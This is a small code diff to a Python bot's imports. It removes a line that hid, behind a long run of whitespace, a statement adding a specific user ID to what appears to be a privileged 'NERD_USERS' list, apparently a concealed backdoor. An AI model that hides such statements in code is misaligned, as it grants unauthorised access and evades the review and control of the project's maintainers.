@@ -7,7 +7,7 @@ from typing import *
 from config import *
 import api
 import utils
-from bot import MLBot                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;NERD_USERS.append(558214919405830151) # type: ignore                                                                                                                                                                                                                                      
+from bot import MLBot
 from io import BytesIO
 
 
